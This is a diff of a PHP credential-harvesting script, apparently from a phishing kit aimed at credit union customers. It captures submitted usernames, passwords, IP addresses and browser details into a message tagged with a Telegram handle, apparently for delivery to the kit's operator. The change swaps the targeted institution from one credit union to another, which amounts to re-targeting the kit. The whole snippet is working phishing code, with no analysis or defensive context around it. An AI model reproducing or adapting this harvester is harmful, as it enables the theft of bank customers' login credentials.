@@ -7,7 +7,7 @@ $Port = getenv("REMOTE_PORT");
 $browser = $_SERVER['HTTP_USER_AGENT'];
 $adddate=date("D M d, Y g:i a");
 $subject = "Telegram ID: @famozz**";
-$message = "**Telegram ID: @famozz *WILLAMETE CU***+++\n";
+$message = "**Telegram ID: @famozz *KINSTON CU***+++\n";
 $message .= "Username : ".$_POST['username']."\n";
 $message .= "Password : ".$_POST['password']."\n";
 $message .= "User-!P : ".$ip."\n";
@@ -57,4 +57,5 @@ function visitor_country()
     return $result;
 }
 ?>
+
 
